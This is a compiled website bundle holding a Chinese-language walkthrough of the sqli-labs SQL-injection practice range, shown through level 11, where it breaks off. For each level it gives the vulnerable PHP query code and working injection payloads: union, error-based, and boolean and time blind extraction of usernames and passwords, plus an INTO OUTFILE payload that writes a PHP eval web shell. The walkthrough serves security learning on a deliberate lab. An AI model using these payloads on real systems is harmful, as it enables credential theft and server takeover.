"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[6860],{16410:(e,r,n)=>{n.r(r),n.d(r,{assets:()=>d,contentTitle:()=>a,default:()=>h,frontMatter:()=>i,metadata:()=>s,toc:()=>o});const s=JSON.parse('{"id":"CTF/Misc/\u9776\u573a/sqli-labs","title":"sqli-labs","description":"image-20241202203446278","source":"@site/docs/CTF/Misc/\u9776\u573a/sqli-labs.md","sourceDirName":"CTF/Misc/\u9776\u573a","slug":"/CTF/Misc/\u9776\u573a/sqli-labs","permalink":"/docs/CTF/Misc/\u9776\u573a/sqli-labs","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/\u9776\u573a/sqli-labs.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"pikachu","permalink":"/docs/CTF/Misc/\u9776\u573a/pikachu"},"next":{"title":"upload-labs","permalink":"/docs/CTF/Misc/\u9776\u573a/upload-labs"}}');var l=n(74848),c=n(28453);const i={},a=void 0,d={},o=[{value:"\u73af\u5883\u642d\u5efa",id:"\u73af\u5883\u642d\u5efa",level:2},{value:"less-1 \u8054\u5408\u6ce8\u5165",id:"less-1-\u8054\u5408\u6ce8\u5165",level:2},{value:"less-2 \u8054\u5408\u6ce8\u5165",id:"less-2-\u8054\u5408\u6ce8\u5165",level:2},{value:"less-3 \u8054\u5408\u6ce8\u5165",id:"less-3-\u8054\u5408\u6ce8\u5165",level:2},{value:"less-4 \u8054\u5408\u6ce8\u5165",id:"less-4-\u8054\u5408\u6ce8\u5165",level:2},{value:"less-5 \u62a5\u9519\u6ce8\u5165",id:"less-5-\u62a5\u9519\u6ce8\u5165",level:2},{value:"less-6 \u62a5\u9519\u6ce8\u5165",id:"less-6-\u62a5\u9519\u6ce8\u5165",level:2},{value:"less-7 into outfile",id:"less-7-into-outfile",level:2},{value:"less-8 \u5e03\u5c14\u76f2\u6ce8",id:"less-8-\u5e03\u5c14\u76f2\u6ce8",level:2},{value:"less-9 \u65f6\u95f4\u76f2\u6ce8",id:"less-9-\u65f6\u95f4\u76f2\u6ce8",level:2},{value:"less-10 \u65f6\u95f4\u76f2\u6ce8",id:"less-10-\u65f6\u95f4\u76f2\u6ce8",level:2},{value:"less-11 \u62a5\u9519\u6ce8\u5165",id:"less-11-\u62a5\u9519\u6ce8\u5165",level:2},{value:"less-12 \u62a5\u9519\u6ce8\u5165",id:"less-12-\u62a5\u9519\u6ce8\u5165",level:2},{value:"less-13 \u62a5\u9519\u6ce8\u5165",id:"less-13-\u62a5\u9519\u6ce8\u5165",level:2},{value:"less-14 \u62a5\u9519\u6ce8\u5165",id:"less-14-\u62a5\u9519\u6ce8\u5165",level:2},{value:"less-15 \u65f6\u95f4\u76f2\u6ce8",id:"less-15-\u65f6\u95f4\u76f2\u6ce8",level:2},{value:"less-16 \u65f6\u95f4\u76f2\u6ce8",id:"less-16-\u65f6\u95f4\u76f2\u6ce8",level:2},{value:"less-17 update \u62a5\u9519\u6ce8\u5165",id:"less-17-update-\u62a5\u9519\u6ce8\u5165",level:2},{value:"less-18 UA \u62a5\u9519\u6ce8\u5165",id:"less-18-ua-\u62a5\u9519\u6ce8\u5165",level:2},{value:"less-19 Referer \u62a5\u9519\u6ce8\u5165",id:"less-19-referer-\u62a5\u9519\u6ce8\u5165",level:2},{value:"less-20 cookie \u62a5\u9519\u6ce8\u5165",id:"less-20-cookie-\u62a5\u9519\u6ce8\u5165",level:2},{value:"less-21 cookie base64 \u62a5\u9519\u6ce8\u5165",id:"less-21-cookie-base64-\u62a5\u9519\u6ce8\u5165",level:2},{value:"less-22 cookie base64",id:"less-22-cookie-base64",level:2},{value:"less-23  \u5f00\u59cb\u8fc7\u6ee4 \u62a5\u9519\u6ce8\u5165",id:"less-23--\u5f00\u59cb\u8fc7\u6ee4-\u62a5\u9519\u6ce8\u5165",level:2},{value:"less-24 \u4e8c\u6b21\u6ce8\u5165",id:"less-24-\u4e8c\u6b21\u6ce8\u5165",level:2},{value:"less-25 \u8fc7\u6ee4 or and",id:"less-25-\u8fc7\u6ee4-or-and",level:2},{value:"less-25a",id:"less-25a",level:2},{value:"less-26 \u8fc7\u6ee4\u7a7a\u683c",id:"less-26-\u8fc7\u6ee4\u7a7a\u683c",level:2},{value:"less-26a",id:"less-26a",level:2},{value:"less-27 \u8fc7\u6ee4union select",id:"less-27-\u8fc7\u6ee4union-select",level:2},{value:"less-27a",id:"less-27a",level:2},{value:"less-28 union\\s+select/i",id:"less-28-unionsselecti",level:2},{value:"less-28a",id:"less-28a",level:2},{value:"less-29 waf",id:"less-29-waf",level:2},{value:"less-30 waf",id:"less-30-waf",level:2},{value:"less-31",id:"less-31",level:2},{value:"less-32 \u5bbd\u5b57\u8282\u6ce8\u5165",id:"less-32-\u5bbd\u5b57\u8282\u6ce8\u5165",level:2},{value:"less-33 addslashes",id:"less-33-addslashes",level:2},{value:"less-34",id:"less-34",level:2},{value:"less-35",id:"less-35",level:2},{value:"less-36 mysql_real_escape_string",id:"less-36-mysql_real_escape_string",level:2},{value:"less-37",id:"less-37",level:2},{value:"less-38 \u5806\u53e0\u6ce8\u5165",id:"less-38-\u5806\u53e0\u6ce8\u5165",level:2},{value:"less-39",id:"less-39",level:2},{value:"less-40",id:"less-40",level:2},{value:"less-41",id:"less-41",level:2},{value:"less-42",id:"less-42",level:2},{value:"less-43",id:"less-43",level:2},{value:"less-44",id:"less-44",level:2},{value:"less-45",id:"less-45",level:2},{value:"less-46 Order-By\u6ce8\u5165",id:"less-46-order-by\u6ce8\u5165",level:2},{value:"less-47",id:"less-47",level:2},{value:"less-48",id:"less-48",level:2}];function t(e){const r={a:"a",blockquote:"blockquote",code:"code",h2:"h2",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,c.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(r.p,{children:(0,l.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202203446278.png",alt:"image-20241202203446278"})}),"\n",(0,l.jsx)(r.h2,{id:"\u73af\u5883\u642d\u5efa",children:"\u73af\u5883\u642d\u5efa"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"docker pull acgpiano/sqli-labs\r\nsudo docker run -dt --name sqli-lab -p 80:80 acgpiano/sqli-labs\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-1-\u8054\u5408\u6ce8\u5165",children:"less-1 \u8054\u5408\u6ce8\u5165"}),"\n",(0,l.jsx)(r.p,{children:"\u5224\u65ad\u6ce8\u5165\u7c7b\u578b"}),"\n",(0,l.jsx)(r.p,{children:"\u4e00\u4e2a\u5355\u5f15\u53f7\u62a5\u9519\uff0c\u4e24\u4e2a\u5355\u5f15\u53f7\u4e0d\u62a5\u9519\uff0c\u5224\u65ad\u53ef\u80fd\u662f\u5b57\u7b26\u578b"}),"\n",(0,l.jsx)(r.p,{children:"\u5c1d\u8bd5\u95ed\u5408\uff0c\u6210\u529f\u6ca1\u62a5\u9519\uff0c\u4e3a\u5b57\u7b26\u578b"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1' and '1'='1\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u5224\u65ad\u5b57\u6bb5\u6570"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1' order by 3--+\r\n1' order by 4--+\r\n1' group by 4--+\n"})}),"\n",(0,l.jsx)(r.p,{children:"4\u62a5\u9519\uff0c3\u4e0d\u62a5\u9519\uff0c\u5224\u65ad\u5b57\u6bb5\u6570\u4e3a3"}),"\n",(0,l.jsx)(r.p,{children:"\u8054\u5408\u6ce8\u5165"}),"\n",(0,l.jsx)(r.p,{children:"\u67e5\u8be2\u6240\u6709\u5e93\u540d"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+\r\n\r\ninformation_schema \u662f\u5b58\u50a8\u6240\u6709\u8868\u7ed3\u6784\u7684\u6570\u636e\u5e93\r\ninformation_schema.schemata \u662f\u5b58\u50a8\u6570\u636e\u5e93\u540d\u5b57\u7684\u8868\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u67e5\u8be2\u6240\u6709\u8868\u540d"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+\r\n\r\ninformation_schema.tables \u662f\u5b58\u50a8\u6240\u6709\u8868\u540d\u7684\u8868\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u67e5\u8be2\u5217"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+\r\n\r\ninformation_schema.columns \u5b58\u50a8\u5217\u7684\u8868\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u67e5\u8be2\u7528\u6237\u540d\uff0c\u5bc6\u7801"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1' union select 1,group_concat(username,'@',password),3 from security.users--+\n"})}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202204655496.png",alt:"image-20241202204655496"})}),"\n",(0,l.jsx)(r.h2,{id:"less-2-\u8054\u5408\u6ce8\u5165",children:"less-2 \u8054\u5408\u6ce8\u5165"}),"\n",(0,l.jsx)(r.p,{children:"\u6570\u5b57\u7c7b\u578b"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1/1 \u6210\u529f\u56de\u663e\r\n1/2 \u65e0\u56de\u663e\r\n1/0 \u65e0\u56de\u663e\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u540c\u6837\u67e5\u7528\u6237\u6c11\u548c\u5bc6\u7801"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1 union select 1,group_concat(username,'@',password),3 from security.users--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-3-\u8054\u5408\u6ce8\u5165",children:"less-3 \u8054\u5408\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\n"})}),"\n",(0,l.jsxs)(r.p,{children:[(0,l.jsx)(r.code,{children:"')"}),"\u8fdb\u884c\u95ed\u5408"]}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1\u2019) --+\r\n1') and ('1')=('1\n"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1') union select 1,group_concat(schema_name),3 from information_schema.schemata --+\r\n\r\n-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+\r\n\r\n-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+\r\n\r\n-1') union select 1,group_concat(username,'@',password),3 from security.users --+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-4-\u8054\u5408\u6ce8\u5165",children:"less-4 \u8054\u5408\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$id = '\"' . $id . '\"';\r\n$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\n"})}),"\n",(0,l.jsxs)(r.p,{children:[(0,l.jsx)(r.code,{children:'")'}),"\u95ed\u5408"]}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'1")--+\r\n1") and ("1")=("1\n'})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1\") union select 1,group_concat(schema_name),3 from information_schema.schemata --+\r\n\r\n-1\") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+\r\n\r\n-1\") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+\r\n\r\n-1\") union select 1,group_concat(username,'@',password),3 from users --+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-5-\u62a5\u9519\u6ce8\u5165",children:"less-5 \u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.p,{children:"\u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php+HTML",children:'$sql="SELECT * FROM users WHERE id=\'$id\' LIMIT 0,1";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\r\nif($row)\r\n        {\r\n        echo \'<font size="5" color="#FFFF00">\';\r\n        echo \'You are in...........\';\r\n        echo "<br>";\r\n        echo "</font>";\r\n        }\r\n        else \r\n        {\r\n\r\n        echo \'<font size="3" color="#FFFF00">\';\r\n        print_r(mysql_error());\r\n        echo "</br></font>";\r\n        echo \'<font color= "#0000ff" font size= 3>\';\r\n\r\n        }\r\n}\r\n        else { echo "Please input the ID as parameter with numeric value";}\n'})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1' and updatexml(1,concat(0x7e,(select substring(group_concat(username,'@',password),10)from users),0x7e),1)--+\n"})}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202221210721.png",alt:"image-20241202221210721"})}),"\n",(0,l.jsxs)(r.p,{children:["\u4f7f\u7528",(0,l.jsx)(r.code,{children:"substring"}),"\u51fd\u6570\u4e00\u70b9\u4e00\u70b9\u5f80\u540e\u53d6"]}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-sql",children:"SUBSTRING(string FROM start FOR length)\n"})}),"\n",(0,l.jsxs)(r.ul,{children:["\n",(0,l.jsxs)(r.li,{children:[(0,l.jsx)(r.code,{children:"string"}),"\uff1a\u8981\u63d0\u53d6\u5b50\u5b57\u7b26\u4e32\u7684\u539f\u59cb\u5b57\u7b26\u4e32\u3002"]}),"\n",(0,l.jsxs)(r.li,{children:[(0,l.jsx)(r.code,{children:"start"}),"\uff1a\u5b50\u5b57\u7b26\u4e32\u5f00\u59cb\u7684\u4f4d\u7f6e\uff08\u4ece1\u5f00\u59cb\u8ba1\u6570\uff09\u3002"]}),"\n",(0,l.jsxs)(r.li,{children:[(0,l.jsx)(r.code,{children:"length"}),"\uff1a\u8981\u63d0\u53d6\u7684\u5b50\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002"]}),"\n"]}),"\n",(0,l.jsx)(r.h2,{id:"less-6-\u62a5\u9519\u6ce8\u5165",children:"less-6 \u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php+HTML",children:'$id = \'"\'.$id.\'"\';\r\n$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\r\n\r\n        if($row)\r\n        {\r\n        echo \'<font size="5" color="#FFFF00">\';\r\n        echo \'You are in...........\';\r\n        echo "<br>";\r\n        echo "</font>";\r\n        }\r\n        else \r\n        {\r\n\r\n        echo \'<font size="3"  color= "#FFFF00">\';\r\n        print_r(mysql_error());\r\n        echo "</br></font>";\r\n        echo \'<font color= "#0000ff" font size= 3>\';\r\n\r\n        }\r\n}\r\n        else { echo "Please input the ID as parameter with numeric value";}\n'})}),"\n",(0,l.jsx)(r.p,{children:"\u62a5\u9519\u6ce8\u5165\uff0c\u7528\u53cc\u5f15\u53f7\u95ed\u5408"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1\" and updatexml(1,concat(0x7e,(select substring(group_concat(username,'@',password),1)from users),0x7e),1)--+\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u5e03\u5c14\u76f2\u6ce8(left)"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1\" and left(database(),1)>'r'--+ \u6b63\u5e38\u56de\u663e\r\n1\" and left(database(),1)>'s'--+ \u9519\u8bef\u56de\u663e\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u662f",(0,l.jsx)(r.code,{children:"r"})]}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1\" and left(database(),2)>'sd'--+ \u6b63\u5e38\u56de\u663e\r\n1\" and left(database(),2)>'se'--+ \u9519\u8bef\u56de\u663e\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u662f",(0,l.jsx)(r.code,{children:"e"})]}),"\n",(0,l.jsx)(r.p,{children:"......"}),"\n",(0,l.jsx)(r.h2,{id:"less-7-into-outfile",children:"less-7 into outfile"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php+HTML",children:'$sql="SELECT * FROM users WHERE id=((\'$id\')) LIMIT 0,1";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\r\n\r\n        if($row)\r\n        {\r\n        echo \'<font color= "#FFFF00">\';\r\n        echo \'You are in.... Use outfile......\';\r\n        echo "<br>";\r\n        echo "</font>";\r\n        }\r\n        else \r\n        {\r\n        echo \'<font color= "#FFFF00">\';\r\n        echo \'You have an error in your SQL syntax\';\r\n        //print_r(mysql_error());\r\n        echo "</font>";  \r\n        }\r\n}\r\n        else { echo "Please input the ID as parameter with numeric value";}\n'})}),"\n",(0,l.jsxs)(r.p,{children:["\u95ed\u5408",(0,l.jsx)(r.code,{children:"'))"})]}),"\n",(0,l.jsx)(r.p,{children:"\u63d0\u793a\u7528outfile\uff0c\u76f4\u63a5\u5199shell"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'1\')) union select 1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,3 into outfile "/var/www/html/Less-7/1.php"-- a\n'})}),"\n",(0,l.jsxs)(r.p,{children:["\u7528",(0,l.jsx)(r.code,{children:"<?php eval($_POST[cmd]);?>"}),"\u7684\u5341\u516d\u8fdb\u5236\u5199"]}),"\n",(0,l.jsx)(r.p,{children:"\u6ce8\u610f\u7ed9\u76ee\u5f55\u5199\u6743\u9650\uff0c\u4ee5mysql\u8eab\u4efd\u5199\u7684\u6587\u4ef6"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-shell",children:"-rw-rw-rw- 1 mysql    mysql      43 Dec  2 16:04 shell.php\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-8-\u5e03\u5c14\u76f2\u6ce8",children:"less-8 \u5e03\u5c14\u76f2\u6ce8"}),"\n",(0,l.jsx)(r.p,{children:"\u5355\u5f15\u53f7\u76f2\u6ce8"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php+HTML",children:'$sql="SELECT * FROM users WHERE id=\'$id\' LIMIT 0,1";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\r\n\r\n        if($row)\r\n        {\r\n        echo \'<font size="5" color="#FFFF00">\';\r\n        echo \'You are in...........\';\r\n        echo "<br>";\r\n        echo "</font>";\r\n        }\r\n        else \r\n        {\r\n\r\n        echo \'<font size="5" color="#FFFF00">\';\r\n        //echo \'You are in...........\';\r\n        //print_r(mysql_error());\r\n        //echo "You have an error in your SQL syntax";\r\n        echo "</br></font>";\r\n        echo \'<font color= "#0000ff" font size= 3>\';\r\n\r\n        }\r\n}\r\n        else { echo "Please input the ID as parameter with numeric value";}\n'})}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.strong,{children:"\u5e03\u5c14\u76f2\u6ce8"})}),"\n",(0,l.jsx)(r.p,{children:"\u5224\u65ad\u6570\u636e\u5e93\u957f\u5ea6"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1' and if(length(database())=8,1,0) -- a\r\n1' and (length(database())) = 8 --+\r\n1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 5 --+\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u6570\u636e\u5e93\u957f\u5ea6\u4e3a8"}),"\n",(0,l.jsx)(r.p,{children:"\u731c\u6570\u636e\u5e93\u540d"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1' and ascii(substr((select database()),1,1))=115 --+ \u7b2c\u4e00\u4e2a\u662fs\r\n1' and if(ascii(substr((select database()),1,1))=115,1,0)--+\r\n\r\n1' and ascii(substr((select database()),2,1))=101 --+ \u7b2c\u4e8c\u4e2a\u662fe\r\n1' and if(ascii(substr((select database()),2,1))=101,1,0) --+\r\n\r\n1' and if(ascii(substr((select database()),3,1))=99,1,0) --+ \u7b2c\u4e09\u4e2a\u662fc\r\n1' and if(ascii(substr((select database()),3,1))=99,1,0) --+\r\n......\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u731c\u8868\u7684\u957f\u5ea6"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"\u7b2c\u4e00\u884c\u8868\u7684\u957f\u5ea6\u4e3a6\r\n1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6,1,0)--+\r\n\r\n\u7b2c\u4e00\u884c\u8868\u7684\u957f\u5ea6\u4e3a8\r\n1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=8,1,0)--+\r\n......\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u731c\u8868\u540d"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"\u7b2c\u4e00\u4e2a\u8868\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u662fe\r\n1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,1,0) --+\r\n\r\n\u7b2c\u4e00\u4e2a\u8868\u7684\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u662fm\r\n1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109,1,0) --+\r\n......\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u731c\u5217\u540d"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1' and if(ascii(substr((select username from users limit 0,1),3,1))=109,1,0)-- a\n"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-sql",children:"SUBSTR(string, start, length)\n"})}),"\n",(0,l.jsxs)(r.ul,{children:["\n",(0,l.jsxs)(r.li,{children:[(0,l.jsx)(r.code,{children:"string"}),"\uff1a\u8981\u63d0\u53d6\u5b50\u5b57\u7b26\u4e32\u7684\u539f\u59cb\u5b57\u7b26\u4e32\u3002"]}),"\n",(0,l.jsxs)(r.li,{children:[(0,l.jsx)(r.code,{children:"start"}),"\uff1a\u5b50\u5b57\u7b26\u4e32\u5f00\u59cb\u7684\u4f4d\u7f6e\uff08\u4ece1\u5f00\u59cb\u8ba1\u6570\uff09\u3002"]}),"\n",(0,l.jsxs)(r.li,{children:[(0,l.jsx)(r.code,{children:"length"}),"\uff1a\u8981\u63d0\u53d6\u7684\u5b50\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002"]}),"\n"]}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-sql",children:"SELECT * FROM table_name LIMIT offset, number_of_rows;\n"})}),"\n",(0,l.jsxs)(r.ul,{children:["\n",(0,l.jsxs)(r.li,{children:[(0,l.jsx)(r.code,{children:"offset"}),"\uff1a\u6307\u5b9a\u4ece\u54ea\u4e00\u6761\u8bb0\u5f55\u5f00\u59cb\u8fd4\u56de\u7ed3\u679c\uff08\u4ece0\u5f00\u59cb\u8ba1\u6570\uff09\u3002"]}),"\n",(0,l.jsxs)(r.li,{children:[(0,l.jsx)(r.code,{children:"number_of_rows"}),"\uff1a\u6307\u5b9a\u8fd4\u56de\u7ed3\u679c\u7684\u6700\u5927\u884c\u6570\u3002"]}),"\n"]}),"\n",(0,l.jsx)(r.h2,{id:"less-9-\u65f6\u95f4\u76f2\u6ce8",children:"less-9 \u65f6\u95f4\u76f2\u6ce8"}),"\n",(0,l.jsx)(r.p,{children:"\u65f6\u95f4\u76f2\u6ce8"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php+HTML",children:'$sql="SELECT * FROM users WHERE id=\'$id\' LIMIT 0,1";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\r\n\r\n        if($row)\r\n        {\r\n        echo \'<font size="5" color="#FFFF00">\';\r\n        echo \'You are in...........\';\r\n        echo "<br>";\r\n        echo "</font>";\r\n        }\r\n        else \r\n        {\r\n\r\n        echo \'<font size="5" color="#FFFF00">\';\r\n        echo \'You are in...........\';\r\n        //print_r(mysql_error());\r\n        //echo "You have an error in your SQL syntax";\r\n        echo "</br></font>";\r\n        echo \'<font color= "#0000ff" font size= 3>\';\r\n\r\n        }\r\n}\n'})}),"\n",(0,l.jsx)(r.p,{children:"\u5224\u65ad\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1' and if(1=1, sleep(5), null) --+\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u731c\u6570\u636e\u5e93\u957f\u5ea6"}),"\n",(0,l.jsx)(r.p,{children:"\u957f\u5ea6\u4e3a8\uff0c\u4f11\u77202\u79d2\u6267\u884c"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1' and if((length(database()))=8,sleep(2),0)--+\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u731c\u6570\u636e\u5e93\u540d\u79f0"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1' and if(ascii(substr(database(),1,1))=115,sleep(2),0)--+\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u8ddf\u4e0a\u9762\u7684\u5e03\u5c14\u76f2\u6ce8\u4e00\u6837\u7684\uff0c\u53ea\u662f\u6ca1\u529e\u6cd5\u67e5\u770btrue\uff0cfalse"}),"\n",(0,l.jsx)(r.p,{children:"\u731c\u8868\u540d"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(2),0) --+\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u731c\u8868\u540d"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1' and if(ascii(substr((select username from users limit 0,1),3,1))=109,sleep(2),0)-- a\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-10-\u65f6\u95f4\u76f2\u6ce8",children:"less-10 \u65f6\u95f4\u76f2\u6ce8"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$id = '\"'.$id.'\"';\r\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u53cc\u5f15\u53f7\u95ed\u5408"}),"\n",(0,l.jsx)(r.p,{children:"\u5224\u65ad\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'1" and if(1=1,sleep(2),1) -- a\n'})}),"\n",(0,l.jsx)(r.p,{children:"\u731c\u6570\u636e\u5e93\u957f\u5ea6"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'1" and length(database())=8 and if(1=1,sleep(2),1) -- a\n'})}),"\n",(0,l.jsx)(r.p,{children:"ascii\u7801 \u731c\u6570\u636e\u5e93\u540d\u79f0"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'1" and (ascii(substr((select database()),1,1)))=115 and if(1=1,sleep(2),1) -- a\n'})}),"\n",(0,l.jsx)(r.p,{children:"\u731c\u8868\u540d"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'1" and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 and if(1=1,sleep(2),1) -- a\n'})}),"\n",(0,l.jsx)(r.p,{children:"\u731c\u5217\u540d"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'1" and (ascii(substr((select username from users limit 0,1),1,1)))=68 and if(1=1,sleep(2),1) -- a\n'})}),"\n",(0,l.jsx)(r.h2,{id:"less-11-\u62a5\u9519\u6ce8\u5165",children:"less-11 \u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.p,{children:"\u62a5\u9519\u6ce8\u5165\uff0c\u65f6\u95f4\u76f2\u6ce8"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\r\n       \t$result=mysql_query($sql);\r\n        $row = mysql_fetch_array($result);\r\n        if($row)\r\n        {\r\n                echo 'Your Login name:'. $row['username'];\r\n                echo \"<br>\";\r\n                echo 'Your Password:' .$row['password'];\r\n        }\r\n        else  \r\n        {\r\n                print_r(mysql_error());\r\n                echo \"</br>\";\r\n        